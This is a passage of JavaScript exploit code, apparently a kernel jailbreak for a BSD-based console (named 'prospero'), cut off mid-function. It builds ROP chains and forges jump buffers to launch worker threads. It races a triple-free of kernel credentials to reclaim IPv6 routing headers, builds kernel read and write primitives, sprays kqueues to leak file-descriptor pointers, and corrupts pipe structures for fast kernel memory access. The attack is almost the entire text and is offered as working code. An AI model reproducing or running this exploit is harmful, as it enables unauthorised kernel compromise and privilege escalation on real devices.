            p(POP_RDI_RET); p(ws.finished + BigInt(wid) * 8n); p(POP_RSI_RET); p(UMTX_OP_WAKE);
            p(POP_RDX_RET); p(0x7FFFFFFFn); p(POP_RCX_RET); p(0n);
            p(POP_R8_RET); p(0n); p(0n); p(0n); p(0n);
            p(POP_RAX_RET); p(UMTX_OP_SYSNUM); p(wrapper);

            // Self-repair: restore mutable ROP chain slots for next iteration
            p(POP_RDI_RET); p(cb + slot_pop_rdx * 8n); p(POP_RAX_RET); p(POP_RDX_RET); p(MOV_DEREF_RDI_RAX_RET);
            p(POP_RDI_RET); p(cb + slot_count * 8n); p(POP_RAX_RET); p(iov_count); p(MOV_DEREF_RDI_RAX_RET);
            p(POP_RDI_RET); p(cb + slot_pop_rax * 8n); p(POP_RAX_RET); p(POP_RAX_RET); p(MOV_DEREF_RDI_RAX_RET);
            p(POP_RDI_RET); p(cb + slot_sysnum * 8n); p(POP_RAX_RET); p(sysnum); p(MOV_DEREF_RDI_RAX_RET);
            p(POP_RDI_RET); p(cb + slot_wrapper * 8n); p(POP_RAX_RET); p(wrapper); p(MOV_DEREF_RDI_RAX_RET);

            // Repair callee-saved registers before loop restart
            p(POP_RAX_RET); p(0n); p(POP_RCX_RET); p(0n);

            // Jump back to loop_start by overwriting RSP
            p(POP_RSP_RET); p(cb + loop_start * 8n);

            // Verify gadget opcodes and chain slots before and after chain construction.
            // verify_rop_gadgets is cached — only runs once per exploit session.
            verify_rop_gadgets();

            // --- Pre-launch canary check: verify ROP chain didn't overrun ---
            const chain_end_canary = read64(raw + ROP_STACK_SIZE);
            if (chain_end_canary !== ROP_CANARY_VAL) {
                emergency_worker_abort("spawn_rop_worker: ROP chain overflow detected (canary corrupted)");
            }

            // --- Chain slot verification: re-read key gadget slots from memory ---
            // Any write64 truncation, alignment error, or heap corruption between
            // chain construction and execution would be caught here.
            verify_chain_slots(cb, [
                { slot: loop_start, expected: POP_RBX_RET, name: "loop_start/POP_RBX_RET" },
                { slot: wait_val_slot, expected: POP_RDX_RET, name: "wait_val_slot/POP_RDX_RET" },
                { slot: slot_pop_rdx, expected: POP_RDX_RET, name: "slot_pop_rdx/POP_RDX_RET" },
                { slot: slot_pop_rax, expected: POP_RAX_RET, name: "slot_pop_rax/POP_RAX_RET" },
                { slot: slot_sysnum, expected: sysnum, name: "slot_sysnum" },
                { slot: slot_wrapper, expected: wrapper, name: "slot_wrapper" },
                { slot: idx - 1n, expected: cb + loop_start * 8n, name: "final_loop_back_addr" },
                { slot: idx - 2n, expected: POP_RSP_RET, name: "pre_loop_back/POP_RSP_RET" },
            ]);

            // --- Forge jmp_buf ---
            // JB_RSP = cb (the ROP chain base — first "ret" pops cb[0] as the next gadget)
            // JB_PC  = cb (execution enters here; "ret" immediately pops the next gadget)
            // This correctly implements a ROP stack: RSP=cb, executing "ret" at PC=cb
            // will pop cb[0] as the next RIP. Since cb[0] is RET (from alignment), the
            // first iteration chains cleanly into the CPU pinning sequence.
            //
            // siglongjmp val = 1 (NOT 0): POSIX mandates val=0 is corrected to 1 internally,
            // but passing 0 explicitly is implementation-defined on some BSD variants.
            // Always pass 1 to guarantee deterministic behavior.
            let jb = forge_prospero_jmpbuf(cb, cb);
            validate_jmpbuf_layout(jb);

            // --- Pre-launch trampoline integrity check ---
            // Re-read jb from memory to catch any write64 race between forge and validate.
            {
                const jb_pc = read64(jb + JB_PC);
                const jb_rsp = read64(jb + JB_RSP);
                if (jb_pc !== cb) emergency_worker_abort("trampoline: JB_PC mismatch after forge");
                if (jb_rsp !== cb) emergency_worker_abort("trampoline: JB_RSP mismatch after forge");
                if ((jb_pc & 0xFn) !== 0n) emergency_worker_abort("trampoline: JB_PC misaligned");
                if ((jb_rsp & 0xFn) !== 0n) emergency_worker_abort("trampoline: JB_RSP misaligned");
            }
            hw_sfence();  // All jb writes must be globally visible before thread spawn

            // Launch thread: start_fn=siglongjmp, arg=jb, val=1
            // Thread will call siglongjmp(jb, 1) which restores registers and jumps to JB_PC
            let at = malloc(0x100); fAI(at); fAS(at, 0x10000n);
            let th = malloc(8); write64(th, 0n);
            fPC(th, at, a_slj, jb, 1n);  // val=1 (not 0) — POSIX requirement
            fAD(at);
        }

        // Initialize workers
        let recvmsg_iovecs = malloc(Number(MSG_IOV_NUM) * 16);
        for (let i = 0n; i < MSG_IOV_NUM * 16n; i += 8n) write64(recvmsg_iovecs + i, 0n);
        write64(recvmsg_iovecs, 1n); write64(recvmsg_iovecs + 8n, 1n);

        let recvmsg_hdr = malloc(0x38);
        for (let i = 0n; i < 0x30n; i += 8n) write64(recvmsg_hdr + i, 0n);
        write64(recvmsg_hdr + 0x10n, recvmsg_iovecs);
        write64(recvmsg_hdr + 0x18n, MSG_IOV_NUM);

        let iov_workers = create_worker_sync(IOV_THREAD_NUM);
        let uio_read_workers = create_worker_sync(UIO_THREAD_NUM);
        let uio_write_workers = create_worker_sync(UIO_THREAD_NUM);

        let uio_read_buf = malloc(64);
        for (let i = 0n; i < 64n; i += 8n) write64(uio_read_buf + i, 0x4141414141414141n);
        let uio_write_buf = malloc(64);
        for (let i = 0n; i < 64n; i += 8n) write64(uio_write_buf + i, 0n);

        let uio_iov_read = malloc(Number(UIO_IOV_COUNT) * 16);
        for (let i = 0n; i < UIO_IOV_COUNT * 16n; i += 8n) write64(uio_iov_read + i, 0n);
        write64(uio_iov_read, uio_read_buf); write64(uio_iov_read + 8n, 8n);

        let uio_iov_write = malloc(Number(UIO_IOV_COUNT) * 16);
        for (let i = 0n; i < UIO_IOV_COUNT * 16n; i += 8n) write64(uio_iov_write + i, 0n);
        write64(uio_iov_write, uio_write_buf); write64(uio_iov_write + 8n, 8n);

        for (let i = 0; i < IOV_THREAD_NUM; i++) spawn_rop_worker(iov_workers, i, iov_sock_a, recvmsg_hdr, 0x1Bn);
        for (let i = 0; i < UIO_THREAD_NUM; i++) spawn_rop_worker(uio_read_workers, i, uio_sock_b, uio_iov_read, 0x79n);
        for (let i = 0; i < UIO_THREAD_NUM; i++) spawn_rop_worker(uio_write_workers, i, uio_sock_a, uio_iov_write, 0x78n);

        let active_uio_mode = 0;

        // --- WORKER REPAIR & RECLAIM-STATE RECOVERY SUBSYSTEM ---
        // Tracks per-worker health, detects poisoning, sanitizes IOV state,
        // and provides loop re-entry protection equivalent to Lua's reclaim logic.

        // Per-worker poison flags: set when a worker fails to complete within timeout
        let iov_worker_poisoned = new Array(IOV_THREAD_NUM).fill(false);
        let uio_rw_poisoned = new Array(UIO_THREAD_NUM).fill(false);

        // Saved recvmsg IOV sentinel values for corruption detection
        const IOV_SENTINEL_LO = 1n;
        const IOV_SENTINEL_HI = 1n;

        function check_worker_liveness(ws, poisoned_arr) {
            // Returns true if all workers are alive (finished flags set).
            // Marks individual workers as poisoned if their slot is still 0
            // after a generous yield window.
            let all_live = true;
            for (let i = 0n; i < ws.total; i++) {
                const fin = read64(ws.finished + i * 8n);
                if (fin === 0n) {
                    poisoned_arr[Number(i)] = true;
                    all_live = false;
                }
            }
            return all_live;
        }

        function sanitize_recvmsg_iovecs() {
            // Restore the recvmsg IOV array to a known-good sentinel state.
            // Called after any suspected IOV corruption or after a failed reclaim.
            // Prevents stale/corrupted iov_base / iov_len leaking into the next round.
            for (let i = 0n; i < MSG_IOV_NUM * 16n; i += 8n) write64(recvmsg_iovecs + i, 0n);
            write64(recvmsg_iovecs, IOV_SENTINEL_LO);
            write64(recvmsg_iovecs + 8n, IOV_SENTINEL_HI);
        }

        function sanitize_uio_iovecs() {
            // Restore both UIO iov arrays to clean state.
            // Prevents leftover size/pointer values from corrupting kernel-side UIO structures.
            for (let i = 0n; i < UIO_IOV_COUNT * 16n; i += 8n) {
                write64(uio_iov_read + i, 0n);
                write64(uio_iov_write + i, 0n);
            }
            write64(uio_iov_read, uio_read_buf); write64(uio_iov_read + 8n, 8n);
            write64(uio_iov_write, uio_write_buf); write64(uio_iov_write + 8n, 8n);
        }

        function repair_worker_state(ws, poisoned_arr, label) {
            // Attempt to repair a poisoned worker group by:
            //  1. Force-writing done flags with SFENCE (guarantees visibility across cores)
            //  2. Re-issuing a UMTX wake to unstick blocked WAIT threads
            //  3. Yielding to let the scheduler drain the stuck threads
            //  4. Resetting poison flags for next attempt
            //
            // Per-worker repair counter: if any worker exceeds ws.max_repairs, the
            // entire exploit is aborted. A worker needing that many repairs has either
            // crashed (SIGSEGV/SIGBUS), drifted into an infinite loop, or had its ROP
            // chain memory corrupted — none of which are recoverable.
            let repaired_any = false;
            for (let i = 0n; i < ws.total; i++) {
                if (poisoned_arr[Number(i)]) {
                    // Increment repair counter BEFORE attempting repair
                    ws.repair_counts[Number(i)]++;
                    if (ws.repair_counts[Number(i)] > ws.max_repairs) {
                        emergency_worker_abort(
                            (label || "worker") + "[" + i + "]: exceeded max repair threshold (" +
                            ws.max_repairs + ") — worker is dead (crashed or chain corrupted)");
                    }

                    // SFENCE before force-write: ensure all prior stores are globally
                    // visible before we write the fake done flag. Without this, the
                    // UMTX_WAKE below could race with the fake done flag being invisible
                    // to the woken thread, causing it to loop back into WAIT again.
                    hw_sfence();
                    write64(ws.finished + i * 8n, 1n);
                    hw_sfence();
                    // Native wake blast: one UMTX_OP_WAKE(INT_MAX) from shellcode,
                    // no JS event-loop involvement between the sfence and the wake.
                    native_umtx_wake(ws.cmd, 1n);
                    poisoned_arr[Number(i)] = false;
                    repaired_any = true;
                }
            }
            if (repaired_any) {
                // Native yield: 8 sched_yields in one shellcode call, no JS overhead.
                native_yield_n(8n);
                exploit_sleep_10ms();
            }
            return repaired_any;
        }

        function reclaim_recovery_check(ws, poisoned_arr, wait_ok, label) {
            if (wait_ok && check_worker_liveness(ws, poisoned_arr)) return true;

            hw_lfence();
            for (let i = 0n; i < ws.total; i++) {
                if (read64(ws.finished + i * 8n) === 0n) poisoned_arr[Number(i)] = true;
            }

            // Atomic test-and-set on g_reclaim_lock.
            // If old value was 1, another path is already in recovery — bail out.
            const lock_old = atomic_xchg64(g_reclaim_lock, 1n);
            if (lock_old !== 0n) return false;

            // Atomic fetch-add on generation counter: returns old value.
            // If the returned gen != expected, we were re-entered despite the lock.
            const our_gen = atomic_fetch_add64(g_reclaim_gen_word, 1n);

            sanitize_recvmsg_iovecs();
            sanitize_uio_iovecs();
            repair_worker_state(ws, poisoned_arr, label);

            // Verify generation hasn't been bumped again under us
            hw_lfence();
            const cur_gen = read64(g_reclaim_gen_word);
            if (cur_gen !== our_gen + 1n) {
                // Another reclaim ran concurrently despite the lock — state is suspect
                hw_sfence();
                atomic_xchg64(g_reclaim_lock, 0n);
                return false;
            }

            // Release reclaim lock with SFENCE (release semantics)
            hw_sfence();
            atomic_xchg64(g_reclaim_lock, 0n);

            if (!triplets_valid()) {
                repair_triplets();
                if (!triplets_valid()) return false;
            }
            return true;
        }

        // Hardened signal/wait with health monitoring and automatic repair
        function signal_iov() {
            signal_workers(iov_workers);
        }
        function wait_iov() {
            // wait_workers returns bool: false = timeout, some workers stuck
            const ok = wait_workers(iov_workers);
            if (!reclaim_recovery_check(iov_workers, iov_worker_poisoned, ok, "iov")) {
                // IOV workers are unrecoverable after repair: hard abort
                emergency_worker_abort("IOV worker group unrecoverable after repair");
            }
        }

        function signal_uio(mode) {
            active_uio_mode = mode;
            if (mode === 0) signal_workers(uio_read_workers);
            else signal_workers(uio_write_workers);
        }
        function wait_uio() {
            if (active_uio_mode === 0) {
                const ok = wait_workers(uio_read_workers);
                // UIO read timeout is recoverable: kread_slow will return null
                // and the caller can retry without hard-aborting.
                reclaim_recovery_check(uio_read_workers, uio_rw_poisoned, ok, "uio_read");
            } else {
                const ok = wait_workers(uio_write_workers);
                reclaim_recovery_check(uio_write_workers, uio_rw_poisoned, ok, "uio_write");
            }
        }

        // --- KREAD / KWRITE PRIMITIVES WITH RECLAIM GUARDS ---
        let kread_sndbuf = malloc(4);
        // (3) kread_result_bufs size guard: each buffer is exactly 64 bytes.
        // If kread_slow is called with size > 64, the native_read_n into
        // kread_result_bufs[i] would overflow into adjacent heap allocations.
        const KREAD_BUF_MAX = 64n;
        let kread_result_bufs = [];
        for (let i = 0; i < UIO_THREAD_NUM; i++) kread_result_bufs.push(malloc(KREAD_BUF_MAX));
        let kwrite_sndbuf = malloc(4);

        // Re-entry protection: memory-backed atomic lock words (not JS booleans).
        // JS booleans are not visible to native ROP worker threads on other cores.
        // g_kprim_lock / g_reclaim_lock are malloc'd 8-byte words operated on
        // by LOCK XCHG / LOCK XADD from the atomic shellcode stubs above.
        // (Initialized in scrt_init() above)

        function kprim_enter(name) {
            // Atomic test-and-set: if lock was already held, abort.
            // XCHG returns the OLD value; if old=1, someone else holds the lock.
            const old = atomic_xchg64(g_kprim_lock, 1n);
            if (old !== 0n) emergency_worker_abort("Overlapping kprim call: " + name);
        }
        function kprim_exit() {
            // Release lock with SFENCE to ensure all prior stores (kread/kwrite
            // results) are globally visible before we signal lock is free.
            hw_sfence();
            atomic_xchg64(g_kprim_lock, 0n);
        }

        function build_uio(buf, iov_ptr, td, is_read, kaddr, size) {
            buf = BigInt(buf); iov_ptr = BigInt(iov_ptr); td = BigInt(td); kaddr = BigInt(kaddr); size = BigInt(size);
            write64(buf, iov_ptr);
            write64(buf + 8n, UIO_IOV_COUNT);
            write64(buf + 16n, 0xFFFFFFFFFFFFFFFFn);
            write64(buf + 24n, size);
            write32(buf + 32n, UIO_SYSSPACE);
            write32(buf + 36n, is_read ? 1n : 0n);
            write64(buf + 40n, td);
            write64(buf + 48n, kaddr);
            write64(buf + 56n, size);
        }

        // JS Implementation of kread_slow logic mimicking p2jb.lua
        // Hardened with re-entry guard, IOV sanitization on all exit paths.
        function kread_slow(kaddr, size) {
            kaddr = BigInt(kaddr); size = BigInt(size);
            kprim_enter("kread_slow");

            if (!triplets_valid()) { kprim_exit(); return null; }

            for (let i = 0n; i < 56n; i += 8n) write64(uio_read_buf + i, 0x4141414141414141n);
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                for (let j = 0n; j < size; j++) write8(kread_result_bufs[i] + j, 0n);
            }

            write32(kread_sndbuf, size);
            safe_syscall(SYSCALL.setsockopt, uio_sock_b, SOL_SOCKET, 0x1001n, kread_sndbuf, 4n);
            safe_syscall(SYSCALL.write, uio_sock_b, scratch_big, size);
            write64(uio_iov_read + 8n, size);

            if (size > KREAD_BUF_MAX) {
                // (3) Prevent heap overflow: kread_result_bufs are KREAD_BUF_MAX bytes each.
                emergency_worker_abort("kread_slow: size " + size + " exceeds kread_result_buf capacity " + KREAD_BUF_MAX);
            }
            free_rthdr(ipv6_sockets[triplets[1]]);
            native_yield_n(3n);

            let uio_iters = 0;
            while (true) {
                signal_uio(0); native_yield_n(1n);
                write32(len_out, 16n);
                native_getsockopt_once(ipv6_sockets[triplets[0]], IPPROTO_IPV6, IPV6_RTHDR, rthdr_readback, len_out);
                if (BigInt(read32(rthdr_readback + 8n)) === BigInt(UIO_IOV_COUNT)) break;
                // Drain: read flush + re-prime write (all native, no JS per drain)
                native_read_n(uio_sock_a, scratch_big, size, 1n);
                for (let i = 0; i < UIO_THREAD_NUM; i++) native_read_n(uio_sock_a, kread_result_bufs[i], size, 1n);
                wait_uio();
                native_write_n(uio_sock_b, scratch_big, size, 1n);
                uio_iters++;
                if (uio_iters > 2000) { sanitize_uio_iovecs(); kprim_exit(); return null; }
            }

            let leaked_iov = read64(rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) {
                sanitize_uio_iovecs(); kprim_exit(); return null;
            }

            build_uio(recvmsg_iovecs, leaked_iov, 0n, true, kaddr, size);

            if (!triplets_valid()) { sanitize_recvmsg_iovecs(); sanitize_uio_iovecs(); kprim_exit(); return null; }
            free_rthdr(ipv6_sockets[triplets[2]]);
            native_yield_n(3n);

            let iov_iters = 0;
            while (true) {
                signal_iov();
                native_yield_n(5n);
                write32(len_out, 64n);
                native_getsockopt_once(ipv6_sockets[triplets[0]], IPPROTO_IPV6, IPV6_RTHDR, rthdr_readback, len_out);
                // hw_lfence() is called inside native_getsockopt_once — buf is safe to read.
                if (BigInt(read32(rthdr_readback + 32n)) === BigInt(UIO_SYSSPACE)) break;
                // (2) IOV drain: three-step sequence required.
                // write provides data for worker's recvmsg; wait_iov() ensures
                // worker finishes before supervisor reads from iov_sock_a;
                // omitting wait_iov() causes supervisor/worker race on iov_sock_a.
                native_write_n(iov_sock_b, scratch_big, 1n, 1n);
                wait_iov();
                native_read_n(iov_sock_a, dummy_byte, 1n, 1n);
                iov_iters++;
                if (iov_iters > 2000) { sanitize_recvmsg_iovecs(); sanitize_uio_iovecs(); kprim_exit(); return null; }
            }

            native_read_n(uio_sock_a, scratch_big, size, 1n);
            let result = null;
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                native_read_n(uio_sock_a, kread_result_bufs[i], size, 1n);
                let v = read64(kread_result_bufs[i]);
                if (v !== 0x4141414141414141n) {
                    let t = find_triplet(triplets[0], -1, FIND_TRIPLET_FAST);
                    if (t === -1) {
                        wait_uio();
                        native_write_n(iov_sock_b, scratch_big, 1n, 1n);
                        wait_iov();
                        native_read_n(iov_sock_a, dummy_byte, 1n, 1n);
                        triplets[1] = find_triplet(triplets[0], triplets[2], FIND_TRIPLET_FAST);
                        sanitize_recvmsg_iovecs(); sanitize_uio_iovecs();
                        kprim_exit(); return null;
                    }
                    triplets[1] = t;
                    result = kread_result_bufs[i];
                }
            }
            wait_uio();
            native_write_n(iov_sock_b, scratch_big, 1n, 1n);

            if (!result) {
                native_read_n(iov_sock_a, dummy_byte, 1n, 1n);
                sanitize_recvmsg_iovecs(); sanitize_uio_iovecs();
                kprim_exit(); return null;
            }

            for (let attempt = 1; attempt <= 5; attempt++) {
                triplets[2] = find_triplet(triplets[0], triplets[1], FIND_TRIPLET_FAST);
                if (triplets[2] !== -1) break;
                native_yield_n(1n);
            }
            if (triplets[2] === -1) {
                native_read_n(iov_sock_a, dummy_byte, 1n, 1n);
                sanitize_recvmsg_iovecs();
                kprim_exit(); return null;
            }

            native_read_n(iov_sock_a, dummy_byte, 1n, 1n);
            kprim_exit();
            return result;
        }



        // Hardened with re-entry guard and IOV sanitization on all exit paths.
        function kwrite_slow(kaddr, data, data_size) {
            kaddr = BigInt(kaddr); data = BigInt(data); data_size = BigInt(data_size);
            kprim_enter("kwrite_slow");

            if (!triplets_valid()) { kprim_exit(); return false; }

            write32(kwrite_sndbuf, data_size);
            safe_syscall(SYSCALL.setsockopt, uio_sock_b, SOL_SOCKET, 0x1001n, kwrite_sndbuf, 4n);
            write64(uio_iov_write + 8n, data_size);

            if (!triplets_valid()) { sanitize_uio_iovecs(); kprim_exit(); return false; }
            free_rthdr(ipv6_sockets[triplets[1]]);
            native_yield_n(3n);

            let uio_iters = 0;
            while (true) {
                signal_uio(1); native_yield_n(1n);
                write32(len_out, 16n);
                native_getsockopt_once(ipv6_sockets[triplets[0]], IPPROTO_IPV6, IPV6_RTHDR, rthdr_readback, len_out);
                if (BigInt(read32(rthdr_readback + 8n)) === BigInt(UIO_IOV_COUNT)) break;
                // Drain: re-prime UIO write workers (all native)
                for (let i = 1; i <= UIO_THREAD_NUM; i++) native_write_n(uio_sock_b, data, data_size, 1n);
                wait_uio();
                uio_iters++;
                if (uio_iters > 2000) { sanitize_uio_iovecs(); kprim_exit(); return false; }
            }

            let leaked_iov = read64(rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) {
                sanitize_uio_iovecs(); kprim_exit(); return false;
            }

            build_uio(recvmsg_iovecs, leaked_iov, 0n, false, kaddr, data_size);

            if (!triplets_valid()) { sanitize_recvmsg_iovecs(); sanitize_uio_iovecs(); kprim_exit(); return false; }
            free_rthdr(ipv6_sockets[triplets[2]]);
            native_yield_n(3n);

            let iov_iters = 0;
            while (true) {
                signal_iov();
                native_yield_n(5n);
                write32(len_out, 64n);
                native_getsockopt_once(ipv6_sockets[triplets[0]], IPPROTO_IPV6, IPV6_RTHDR, rthdr_readback, len_out);
                if (BigInt(read32(rthdr_readback + 32n)) === BigInt(UIO_SYSSPACE)) break;
                // (2) IOV drain: three-step with wait_iov() between write and read.
                native_write_n(iov_sock_b, scratch_big, 1n, 1n);
                wait_iov();
                native_read_n(iov_sock_a, dummy_byte, 1n, 1n);
                iov_iters++;
                if (iov_iters > 2000) { sanitize_recvmsg_iovecs(); sanitize_uio_iovecs(); kprim_exit(); return false; }
            }

            for (let i = 1; i <= UIO_THREAD_NUM; i++) native_write_n(uio_sock_b, data, data_size, 1n);

            for (let attempt = 1; attempt <= 5; attempt++) {
                triplets[1] = find_triplet(triplets[0], -1, FIND_TRIPLET_FAST);
                if (triplets[1] !== -1) break;
                native_yield_n(1n);
            }
            if (triplets[1] === -1) { sanitize_recvmsg_iovecs(); kprim_exit(); return false; }

            wait_uio();
            native_write_n(iov_sock_b, scratch_big, 1n, 1n);

            for (let attempt = 1; attempt <= 5; attempt++) {
                triplets[2] = find_triplet(triplets[0], triplets[1], FIND_TRIPLET_FAST);
                if (triplets[2] !== -1) break;
                native_yield_n(1n);
            }
            if (triplets[2] === -1) { sanitize_recvmsg_iovecs(); kprim_exit(); return false; }

            native_read_n(iov_sock_a, dummy_byte, 1n, 1n);
            kprim_exit();
            return true;
        }

        function kslow64(kaddr) {
            for (let attempt = 1; attempt <= 3; attempt++) {
                if (triplets_valid()) {
                    let buf = kread_slow(kaddr, 8);
                    if (buf) {
                        let val = read64(buf);
                        if (val !== 0n) {
                            if ((val >> 48n) === 0xFFFFn) return val;
                            if ((val >> 40n) !== 0n) return val;
                        }
                    }
                }
                repair_triplets(); native_yield_n(1n);
            }
            return null;
        }

        async function attempt_race() {
            for (let i = 0; i < ipv6_count; i++) {
                free_rthdr(ipv6_sockets[i]);
            }

            // Free ucred first time
            free_one_fd();

            // flush iov workers to stabilize
            for (let i = 0; i < 32; i++) {
                signal_iov();
                native_write_n(iov_sock_b, scratch_big, 1n, 1n);
                wait_iov();
                native_read_n(iov_sock_a, dummy_byte, 1n, 1n);
            }

            // Free ucred second time
            free_one_fd();

            let twins = find_twins(MAX_ROUNDS_TWIN);
            if (!twins) {
                await log("failed to find twins");
                return false;
            }

            // free twin[2] rthdr and race to reclaim
            free_rthdr(ipv6_sockets[twins[1]]);
            native_yield_n(2n);

            let reclaimed = false;
            let verify_buf = malloc(UCRED_SIZE);
            let verify_len = malloc(4);

            for (let i = 0; i < MAX_ROUNDS_TRIPLET; i++) {
                signal_iov();
                native_yield_n(4n);

                // (4) Use native_getsockopt_once: eliminates JS dispatch from
                // the race-critical polling loop in attempt_race.
                write32(verify_len, 8n);
                native_getsockopt_once(ipv6_sockets[twins[0]], IPPROTO_IPV6, IPV6_RTHDR, verify_buf, verify_len);
                if (BigInt(read32(verify_buf)) === 1n) {
                    reclaimed = true;
                    break;
                }
                // (2) Restore three-step drain with wait_iov()
                native_write_n(iov_sock_b, scratch_big, 1n, 1n);
                wait_iov();
                native_read_n(iov_sock_a, dummy_byte, 1n, 1n);
            }

            if (!reclaimed) {
                await log("not reclaimed");
                return false;
            }

            triplets[0] = twins[0];

            // Free ucred third time
            free_one_fd();
            native_yield_n(1n);

            triplets[1] = find_triplet(triplets[0], -1, MAX_ROUNDS_TRIPLET);
            if (triplets[1] === -1) {
                await log("triplets[1] == -1");
                return false;
            }

            native_write_n(iov_sock_b, scratch_big, 1n, 1n);
            triplets[2] = find_triplet(triplets[0], triplets[1], MAX_ROUNDS_TRIPLET);
            wait_iov();
            native_read_n(iov_sock_a, dummy_byte, 1n, 1n);

            if (triplets[2] === -1) {
                await log("triplets[2] == -1");
                return false;
            }

            return true;
        }

        await prepare_fds();

        let race_success = false;
        for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
            if (await attempt_race()) {
                race_success = true;
                await log("Race success! Triplets: " + triplets.join(','));
                break;
            }
        }

        if (!race_success) {
            await log("Race failed");
            send_notification("Race failed");
            return;
        }

        await log("Stage 1 Kqueue reclaim");
        send_notification("Stage 1\nKqueue reclaim");

        // 1. Synchronous Control Flow Isolation: Tight allocator window
        free_rthdr(ipv6_sockets[triplets[2]]);

        let proc_filedesc = 0n;
        let kq_found = false;
        let kq_batch = [];
        let successful_kq = -1n;

        // Block engine context entirely (no JS yielding) during spray
        for (let _i = 0; _i < 5000; _i++) {
            let kq = safe_syscall(SYSCALL.kqueue);

            if (kq < 0n || kq === 0xffffffffffffffffn) {
                // Out of FDs or error, flush batch
                for (let i = 0; i < kq_batch.length; i++) {
                    safe_syscall(SYSCALL.close, kq_batch[i]);
                }
                kq_batch = [];
                // Safe to yield here as we failed this sub-batch
                native_yield_n(1n);
                continue;
            }

            kq_batch.push(kq);

            // Tight window: immediate check
            write32(len_out, 256n);
            get_rthdr(ipv6_sockets[triplets[0]], rthdr_readback, len_out);

            let sig = BigInt(read32(rthdr_readback + 8n));
            let leaked_fdp = read64(rthdr_readback + runtime_offsets.KQ_FDP); // OFF.KQ_FDP

            // 3. Match the Structural Offsets Natively
            if (sig === 0x1430000n && leaked_fdp !== 0n) {
                // Validate pointer resides in kernel boundaries
                if ((leaked_fdp >> 48n) === 0xFFFFn) {
                    kq_found = true;
                    successful_kq = kq;

                    // Pointer Protection: Lock isolated pointer to high-scope variable immediately
                    proc_filedesc = leaked_fdp;
                    break;
                }
            }
        }

        // 2. Redesign the Batch and Cleanup Lifecycle
        if (kq_found) {
            // Isolate exact successful file descriptor first
            for (let i = 0; i < kq_batch.length; i++) {
                let fd = kq_batch[i];
                if (fd !== successful_kq) {
                    safe_syscall(SYSCALL.close, fd);
                }
            }
            // Close the successful kqueue as well to free it for subsequent exploit stages
            safe_syscall(SYSCALL.close, successful_kq);
        } else {
            // Complete cleanup on total failure
            for (let i = 0; i < kq_batch.length; i++) {
                safe_syscall(SYSCALL.close, kq_batch[i]);
            }
            await log("kqueue reclaim failed");
            send_notification("Kqueue reclaim failed");
            return;
        }

        await log("proc_filedesc: " + toHex(proc_filedesc));

        // 4. Post-Reclaim Triplet Repair Verification (Synchronous)
        triplets[1] = find_triplet(triplets[0], triplets[2], 50000);

        if (triplets[1] === -1) {
            await log("Synchronization Error: Triplet tracking array lost stability post-reclamation.");
            send_notification("Synchronization Error: Triplet tracking lost.");
            return;
        }

        await log("Stage 2 Leak pipe data pointers");
        send_notification("Stage 2\nLeak pipe data pointers");

        // Create pipe pairs for kernel r/w primitive (master and victim)
        let master_pipe = malloc(8);
        safe_syscall(SYSCALL.pipe, master_pipe);
        let master_rfd = read32(master_pipe);
        let master_wfd = read32(master_pipe + 4n);

        let victim_pipe = malloc(8);
        safe_syscall(SYSCALL.pipe, victim_pipe);
        let victim_rfd = read32(victim_pipe);
        let victim_wfd = read32(victim_pipe + 4n);

        let fd_ofiles = 0n;
        let master_fp = 0n, victim_fp = 0n;
        let master_pipe_data = 0n, victim_pipe_data = 0n;
        let stage2_ok = false;



        for (let attempt = 1; attempt <= 5; attempt++) {
            repair_triplets(); exploit_sleep_100ms();

            let fdescenttbl = kslow64(proc_filedesc + runtime_offsets.FILEDESC_OFILES);
            if (fdescenttbl) {
                fd_ofiles = fdescenttbl + runtime_offsets.FDESCENTTBL_HDR;
                repair_triplets(); exploit_sleep_50ms(); repair_triplets();

                master_fp = kslow64(fd_ofiles + BigInt(master_rfd) * runtime_offsets.FILEDESCENT_SIZE);
                if (master_fp) {
                    repair_triplets(); exploit_sleep_50ms(); repair_triplets();

                    victim_fp = kslow64(fd_ofiles + BigInt(victim_rfd) * runtime_offsets.FILEDESCENT_SIZE);
                    if (victim_fp) {
                        repair_triplets(); exploit_sleep_50ms(); repair_triplets();

                        master_pipe_data = kslow64(master_fp);
                        if (master_pipe_data) {
                            repair_triplets(); exploit_sleep_50ms(); repair_triplets();

                            victim_pipe_data = kslow64(victim_fp);
                            if (victim_pipe_data && master_pipe_data !== victim_pipe_data) {
                                stage2_ok = true;
                            }
                        }
                    }
                }
            }
            if (stage2_ok) break;
            exploit_sleep_50ms(); repair_triplets();
        }

        if (!stage2_ok) { await log("[2] failed"); send_notification("[2] failed"); return; }
        await log("[2] master_pipe=" + toHex(master_pipe_data) + " victim_pipe=" + toHex(victim_pipe_data));

        await log("Stage 3 Pipe corruption -> fast kernel r/w");
        send_notification("Stage 3\nPipe corruption -> fast kernel r/w");

        let pipe_overwrite = malloc(24);
        write32(pipe_overwrite, 0n);
        write32(pipe_overwrite + 4n, 0n);
        write32(pipe_overwrite + 8n, 0n);
        write32(pipe_overwrite + 12n, 0x4000n); // PAGE_SIZE approx
        write64(pipe_overwrite + 16n, victim_pipe_data);

        // --- Cross-Verification Assertions ---
        if (!victim_pipe_data || (victim_pipe_data >> 48n) !== 0xFFFFn) {
            await log("Validation Error: victim_pipe_data pointer failed canonical mapping verification");
            send_notification("Pointer Assertion Failed");
            return;
        }
        if (!master_pipe_data || (master_pipe_data >> 48n) !== 0xFFFFn) {
            await log("Validation Error: master_pipe_data pointer failed canonical mapping verification");
            send_notification("Pointer Assertion Failed");
            return;
        }

        exploit_sleep_100ms();

        let corrupt_ok = false;
        for (let attempt = 1; attempt <= 3; attempt++) {
            repair_triplets();
            if (kwrite_slow(master_pipe_data, pipe_overwrite, 24)) { corrupt_ok = true; break; }
            exploit_sleep_100ms(); native_yield_n(1n);
        }
        if (!corrupt_ok) { await log("[3] kwrite_slow failed"); send_notification("[3] failed"); return; }
        native_yield_n(1n);

        let pipe_cmd_buf = malloc(24);
        function set_victim_pipe(cnt, inp, out, size, buf_addr) {
            write32(pipe_cmd_buf, BigInt(cnt));
            write32(pipe_cmd_buf + 4n, BigInt(inp));
            write32(pipe_cmd_buf + 8n, BigInt(out));
            write32(pipe_cmd_buf + 12n, BigInt(size));
